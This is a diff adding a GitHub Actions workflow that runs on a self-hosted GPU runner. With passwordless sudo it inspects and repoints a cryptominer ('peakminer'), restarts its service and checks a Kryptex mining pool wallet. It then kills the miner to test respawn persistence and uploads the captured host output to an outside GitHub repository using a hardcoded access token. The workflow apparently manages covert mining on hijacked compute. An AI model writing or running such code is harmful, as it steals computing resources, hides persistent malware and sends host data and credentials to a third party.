@@ -1,0 +1,39 @@
+name: ul-t2-rp4
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  r:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 20
+    steps:
+      - name: rp4
+        run: |
+          set +e
+          exec > >(tee /tmp/ul_t2_rp4.out) 2>&1
+          S="sudo -n"; H=$(hostname -s)
+          echo "== rp4 $H $(date -u +%FT%TZ)"
+          echo "-- ourlog"; timeout 10 $S tail -30 /opt/ul-t2/logs/*.log 2>&1 | cut -c1-200
+          echo "-- procs"; timeout 10 ps -eo pid,ppid,user,args= | grep -E '[p]eakminer|[w]ildrig' | cut -c1-140
+          echo "-- ppids"; for p in $(timeout 5 pgrep -f '[p]eakminer'); do pp=$(ps -o ppid= -p $p | tr -d ' '); echo "pid=$p ppid=$pp $(ps -o args= -p $pp 2>/dev/null | cut -c1-90)"; done
+          echo "-- units"; timeout 15 $S sh -c "systemctl list-units --all --no-legend 2>/dev/null | grep -iE 'nv-|t19|ul-|super' | head -12"
+          echo "-- cron"; $S crontab -l 2>/dev/null | grep -vE '^#' | tail -10
+          echo "-- adopt nv binary"
+          $S sed -i 's#/opt/ul-t2/peakminer#/opt/nv/peakminer#' /opt/ul-t2/run.sh
+          $S grep -o '/opt/nv/peakminer' /opt/ul-t2/run.sh | head -1
+          $S systemctl restart ul-t2-ps@0
+          sleep 25
+          echo "-- ourproc"; timeout 10 pgrep -af '[u]l-t2-ps-' | cut -c1-150
+          echo "-- ourlog2"; timeout 10 $S tail -20 /opt/ul-t2/logs/*.log 2>&1 | cut -c1-200
+          echo "-- gpu"; timeout 15 nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader
+          echo "-- pool"
+          for i in $(seq 1 6); do R=$(timeout 20 curl -s -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep 'ul-t2-ps'); echo "p$i ${R:0:190}"; [ -n "$R" ] && break; sleep 15; done
+          echo "-- respawn"; timeout 10 $S pkill -9 -f '[u]l-t2-ps-'; T0=$(date +%s)
+          for j in $(seq 1 12); do sleep 5; if timeout 5 pgrep -f '[u]l-t2-ps-' >/dev/null; then echo "RESPAWN=$(( $(date +%s) - T0 ))s"; break; fi; done
+          echo "== done"
+          sleep 2
+          b=$(base64 -w0 /tmp/ul_t2_rp4.out); GH=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
+          F=cmdout8/ul-t2-rp4_$H.txt
+          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 rp4 $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 rp4 $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
+          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
